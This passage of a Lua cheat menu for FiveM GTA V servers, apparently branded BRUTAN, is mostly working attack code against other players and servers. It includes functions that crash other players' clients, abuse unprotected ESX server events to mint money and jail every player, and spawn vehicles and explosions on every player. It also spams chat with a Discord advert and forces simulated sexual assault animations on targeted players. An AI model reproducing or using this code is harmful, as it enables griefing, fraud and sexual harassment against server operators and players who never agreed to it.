    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end

function MaxOutPerf(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
end

function CrashPlayer(ped)
    local playerPos = GetEntityCoords(ped, false)
    local modelHashes = {
        0x34315488,
        0x6A27FEB1, 0xCB2ACC8,
        0xC6899CDE, 0xD14B5BA3,
        0xD9F4474C, 0x32A9996C,
        0x69D4F974, 0xCAFC1EC3,
        0x79B41171, 0x1075651,
        0xC07792D4, 0x781E451D,
        0x762657C6, 0xC2E75A21,
        0xC3C00861, 0x81FB3FF0,
        0x45EF7804, 0xE65EC0E4,
        0xE764D794, 0xFBF7D21F,
        0xE1AEB708, 0xA5E3D471,
        0xD971BBAE, 0xCF7A9A9D,
        0xC2CC99D8, 0x8FB233A4,
        0x24E08E1F, 0x337B2B54,
        0xB9402F87, 0x4F2526DA
    }

    for i = 1, #modelHashes do
        obj = CreateObject(modelHashes[i], playerPos.x, playerPos.y, playerPos.z, true, true, true)
    end
end

capPa = 'd' .. 'o' .. 'k' .. 'i'
cappA = 'd' .. 'o' .. 'k' .. 'i' .. capPa
local bD = cappA

function esxdestroyv2()
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent('esx_jobs:caution', 'give_back', 9999999999)
                        TriggerServerEvent('esx_fueldelivery:pay', 9999999999)
                        TriggerServerEvent('esx_carthief:pay', 9999999999)
                        TriggerServerEvent('esx_godirtyjob:pay', 9999999999)
                        TriggerServerEvent('esx_pizza:pay', 9999999999)
                        TriggerServerEvent('esx_ranger:pay', 9999999999)
                        TriggerServerEvent('esx_garbagejob:pay', 9999999999)
                        TriggerServerEvent('esx_truckerjob:pay', 9999999999)
                        TriggerServerEvent('AdminMenu:giveBank', 9999999999)
                        TriggerServerEvent('AdminMenu:giveCash', 9999999999)
                        TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
                        TriggerServerEvent('esx_banksecurity:pay', 9999999999)
                        TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                'Brutan#3927 BRUTAN',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. 'https://discordapp.com/invite/tCEajtn'
                            )
                        end
                        for i = 0, 256 do
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx_billing:sendBill',
                                GetPlayerServerId(i),
                                'Purposeless',
                                'Brutan#3927 BRUTAN https://discordapp.com/invite/tCEajtn',
                                43161337
                            )
                            TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
                            TriggerServerEvent('NB:recruterplayer', i, 'police', 3)
                        end
                    end
                )
end

function ch(C,x,y)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(C)
    DrawText(x,y)
end

local function getPlayerIds()
    local players = {}
    for i = -1, 128 do
        if NetworkIsPlayerActive(i) then
            players[#players + 1] = i
        end
    end
    return players
end

function DrawText3D(x, y, z, text, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(0.0, 0.20)
    SetTextColour(r, g, b, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
    AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
    blockinput = true

    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end

    if UpdateOnscreenKeyboard() ~= 2 then
        local result = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        blockinput = false
        return result
    else
        Citizen.Wait(500)
        blockinput = false
        return nil
    end
end

function DelVeh(veh)
    SetEntityAsMissionEntity(veh, 1, 1)
    DeleteEntity(veh)
end

function Clean(veh)
	SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
	SetVehicleDirtLevel(veh, 1.0)
end

function GetInputMode()
    return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function TeleportToCoords()
    local x = KeyboardInput("Enter X Pos", "", 100)
    local y = KeyboardInput("Enter Y Pos", "", 100)
    local z = KeyboardInput("Enter Z Pos", "", 100)
    local entity
    if x ~= "" and y ~= "" and z ~= "" then
        if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
        else
            entity = PlayerPedId()
        end
        if entity then
            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
        end
    else
        drawNotification("~g~Invalid Coords!")
    end
end

function TeleportToWaypoint()
    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        local blipIterator = GetBlipInfoIdIterator(8)
        local blip = GetFirstBlipInfoId(8, blipIterator)
        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
        wp = true



        local zHeigt = 0.0
        height = 1000.0
        while true do
            Citizen.Wait(0)
            if wp then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end

                SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
                FreezeEntityPosition(entity, true)
                local Pos = GetEntityCoords(entity, true)

                if zHeigt == 0.0 then
                    height = height - 25.0
                    SetEntityCoords(entity, Pos.x, Pos.y, height)
                    bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
                else
                    SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
                    FreezeEntityPosition(entity, false)
                    wp = false
                    height = 1000.0
                    zHeigt = 0.0
                    drawNotification("~g~Teleported to waypoint!")
                    break
                end
            end
        end
    else
        drawNotification("~r~No waypoint!")
    end
end

function rapeplayer()
    Citizen.CreateThread(
        function()
            RequestModelSync('a_m_o_acult_01')
            RequestAnimDict('rcmpaparazzo_2')
            while not HasAnimDictLoaded('rcmpaparazzo_2') do
                Citizen.Wait(0)
            end
            if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                end
                SetEntityAsMissionEntity(veh, true, true)
                DeleteVehicle(veh)
                DeleteEntity(veh)
            end
            count = -0.2
            for b = 1, 3 do
                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                local bz = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                SetEntityAsMissionEntity(bz, true, true)
                AttachEntityToEntity(
                    bz,
                    GetPlayerPed(SelectedPlayer),
                    4103,
                    11816,
                    count,
                    0.00,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    false,
                    false,
                    false,
                    2,
                    true
                )
                ClearPedTasks(GetPlayerPed(SelectedPlayer))
                TaskPlayAnim(
                    GetPlayerPed(SelectedPlayer),
                    'rcmpaparazzo_2',
                    'shag_loop_poppy',
                    2.0,
                    2.5,
                    -1,
                    49,
                    0,
                    0,
                    0,
                    0
                )
                SetPedKeepTask(bz)
                TaskPlayAnim(bz, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetEntityInvincible(bz, true)
                count = count - 0.4
            end
        end
    )
end

function RapeAllFunc()
    for bs=0,9 do
        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"You just got fucked mate")
    end
    Citizen.CreateThread(function()
        for i=0,128 do
            RequestModelSync("a_m_o_acult_01")
            RequestAnimDict("rcmpaparazzo_2")
            while not HasAnimDictLoaded("rcmpaparazzo_2")do
                Citizen.Wait(0)
            end
            if IsPedInAnyVehicle(GetPlayerPed(i),true)then
                local veh=GetVehiclePedIsIn(GetPlayerPed(i),true)
                while not NetworkHasControlOfEntity(veh)do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                end
                SetEntityAsMissionEntity(veh,true,true)
                DeleteVehicle(veh)DeleteEntity(veh)end
                count=-0.2
                for b=1,3 do
                    local x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(i),true))
                    local bD=CreatePed(4,GetHashKey("a_m_o_acult_01"),x,y,z,0.0,true,false)
                    SetEntityAsMissionEntity(bD,true,true)
                    AttachEntityToEntity(bD,GetPlayerPed(i),4103,11816,count,0.00,0.0,0.0,0.0,0.0,false,false,false,false,2,true)
                    ClearPedTasks(GetPlayerPed(i))TaskPlayAnim(GetPlayerPed(i),"rcmpaparazzo_2","shag_loop_poppy",2.0,2.5,-1,49,0,0,0,0)
                    SetPedKeepTask(bD)TaskPlayAnim(bD,"rcmpaparazzo_2","shag_loop_a",2.0,2.5,-1,49,0,0,0,0)
                    SetEntityInvincible(bD,true)count=count-0.4
            end
        end
    end)
end

function teleportToNearestVehicle()
            local playerPed = GetPlayerPed(-1)
            local playerPedPos = GetEntityCoords(playerPed, true)
            local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
            local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
            local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
            local NearestPlanePos = GetEntityCoords(NearestPlane, true)
        drawNotification("~y~Wait...")
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
            drawNotification("~r~No Vehicle Found")
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
            if IsVehicleSeatFree(NearestPlane, -1) then
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
            if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestVehicle, -1) then
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                end
            elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestPlane, -1) then
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                end
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        end

    end


    -- Discord presenece
    Citizen.CreateThread(function()
        while discordPresence do
            --This is the Application ID (Replace this with you own)
            SetDiscordAppId(615150377309831179)

            --Here you will have to put the image name for the "large" icon.
            SetDiscordRichPresenceAsset("logo_name")

            --(11-11-2018) New Natives:

            --Here you can add hover text for the "large" icon.
            SetDiscordRichPresenceAssetText("This is a lage icon with text")

            --Here you will have to put the image name for the "small" icon.
            SetDiscordRichPresenceAssetSmall("logo_name")

            --Here you can add hover text for the "small" icon.
            SetDiscordRichPresenceAssetSmallText("This is a lsmall icon with text")

            --It updates every one minute just in case.
            Citizen.Wait(2000)
        end
    end)

	local function d(e)
    local f = {}
    local h = GetGameTimer() / 200
    f.r = math.floor(math.sin(h * e + 0) * 127 + 128)
    f.g = math.floor(math.sin(h * e + 2) * 127 + 128)
    f.b = math.floor(math.sin(h * e + 4) * 127 + 128)
    return f
end
	
local cL = true
local cM = false
local cN = true
local cO = true
Citizen.CreateThread(
    function()
        while true do
            Wait(1)
            for f = 0, 128 do
                if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
                    ped = GetPlayerPed(f)
                    blip = GetBlipFromEntity(ped)
                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(f), false, false, '', false)
                    wantedLvl = GetPlayerWantedLevel(f)
                    if cM then
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true)
                        if wantedLvl then
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true)
                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                        else
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        end
                    else
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false)
                    end
                    if cL then
                        if not DoesBlipExist(blip) then
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                            SetBlipNameToPlayerName(blip, f)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehClass == 16 then
                                    if
                                        vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or
                                            vehModel == GetHashKey('lazer')
                                     then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                            SetBlipNameToPlayerName(blip, f)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif
                                    vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or
                                        vehModel == GetHashKey('limo2')
                                 then
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehModel == GetHashKey('rhino') then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            end
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(blip, f)
                            SetBlipScale(blip, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(blip, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                                distance =
                                    math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) +
                                    900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    else
                        RemoveBlip(blip)
                    end
                end
            end
        end
    end
)

function ShootPlayer(player)
    local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end


function SpawnObjOnPlayer(modelHash)
    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
    local obj CreateObject(modelHash, coords.x, coords.y, coords.z, true, true, true)
        if attachProp then
            AttachEntityToEntity(obj ,GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true ,true ,false, true, 1, true)
        end
end

function nukeserver()
    Citizen.CreateThread(function()
        local dg="Avenger"
        local dh="CARGOPLANE"
        local di="luxor"
        local dj="maverick"
        local dk="blimp2"

        while not HasModelLoaded(GetHashKey(dh))do
            Citizen.Wait(0)
            RequestModel(GetHashKey(dh))
        end

        while not HasModelLoaded(GetHashKey(di))do
            Citizen.Wait(0)RequestModel(GetHashKey(di))
        end

        while not HasModelLoaded(GetHashKey(dg))do
            Citizen.Wait(0)RequestModel(GetHashKey(dg))
        end

        while not HasModelLoaded(GetHashKey(dj))do
            Citizen.Wait(0)RequestModel(GetHashKey(dj))
        end

        while not HasModelLoaded(GetHashKey(dk))do
            Citizen.Wait(0)RequestModel(GetHashKey(dk))
        end

        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"BRUTAN; Brutan#3927")
        end

        for i=0,128 do
            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
        end
     end)
    end

function rotDirection(rot)
    local radianz = rot.z * 0.0174532924
    local radianx = rot.x * 0.0174532924
    local num = math.abs(math.cos(radianx))

    local dir = vector3(-math.sin(radianz) * num, math.cos(radianz) * num, math.sin(radianx))

    return dir
end

function GetDistance(pointA, pointB)

    local aX = pointA.x
    local aY = pointA.y
    local aZ = pointA.z

    local bX = pointB.x
    local bY = pointB.y
    local bZ = pointB.z

    local xBA = bX - aX
    local yBA = bY - aY
    local zBA = bZ - aZ

    local y2 = yBA * yBA
    local x2 =  xBA * xBA
    local sum2 = y2 + x2

    return math.sqrt(sum2 + zBA)
end

function getPosition()
  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
  return x,y,z
end

function getCamDirection()
  local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(GetPlayerPed(-1))
  local pitch = GetGameplayCamRelativePitch()

  local x = -math.sin(heading*math.pi/180.0)
  local y = math.cos(heading*math.pi/180.0)
  local z = math.sin(pitch*math.pi/180.0)

  -- normalize
  local len = math.sqrt(x*x+y*y+z*z)
  if len ~= 0 then
    x = x/len
    y = y/len
    z = z/len
  end

  return x,y,z
end

function RotToDirection(rot)
    local radiansZ = rot.z * 0.0174532924
    local radiansX = rot.x * 0.0174532924
    local num = math.abs(math.cos(radiansX))
    local dir = vector3(-math.sin(radiansZ) * num, math.cos(radiansZ * num), math.sin(radiansX))
    return dir
end

function add(a, b)
    local result = vector3(a.x + b.x, a.y + b.y, a.z + b.z)

    return result
end

function multiply(coords, coordz)
    local result = vector3(coords.x * coordz, coords.y * coordz, coords.z * coordz)

    return result
end

function SpectatePlayer(player)
    local playerPed = PlayerPedId()
    Spectating = not Spectating
    local targetPed = GetPlayerPed(player)

    if (Spectating) then
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(true, targetPed)

        drawNotification("Spectating " .. GetPlayerName(player))
    else
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(false, targetPed)

        drawNotification("Stopped Spectating " .. GetPlayerName(player))
    end
end

Citizen.CreateThread(
    function()
        while true do
            Citizen.Wait(0)

            DisplayRadar(true)

            SetPlayerWantedLevel(PlayerId(), 0, false)

            SetPlayerWeaponDamageModifier(PlayerId(), selectedDamage)
            SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedDamage)

            if infStamina then
                RestorePlayerStamina(PlayerId(), 1.0)
            end
			
			if chatspam then
                TriggerServerEvent(
                    '_chat:messageEntered',
                    'Brutan#3927',
                    {0, 0x99, 255},
                    '/ooc BRUTAN Menu! Buy at https://discordapp.com/invite/tCEajtn'
                )
                TriggerServerEvent('_chat:messageEntered', 'Brutan#3927', {0, 0x99, 255}, 'BRUTAN menu <3 https://discordapp.com/invite/tCEajtn')
            end
	
			if banallusers then
				for i = 0, 128 do
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN BO$$ <3 Brutan#3927 https://discordapp.com/invite/tCEajtn")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "BRUTAN<3 Brutan#3927 https://discordapp.com/invite/tCEajtn")
					end
				end

						if esxdestroy then
				for i = 0, 128 do
						TriggerServerEvent("esx_truckerjob:pay", 9999999999)
						TriggerServerEvent("AdminMenu:giveCash", 9999999999)
						TriggerServerEvent("esx_dmvschool:pay",  9999999999)
						TriggerServerEvent("LegacyFuel:PayFuel", 9999999999)
				end
			end
			
            if invisible then
		        local noclip_speed = 1.0
        local ped = GetPlayerPed(-1)
        local x,y,z = getPosition()
        local dx,dy,dz = getCamDirection()
        local speed = noclip_speed
		SetEntityVisible(GetPlayerPed(-1), false, false)
		SetEntityInvincible(GetPlayerPed(-1), true)
		SetEntityVisible(ped, false);
            end
			
			
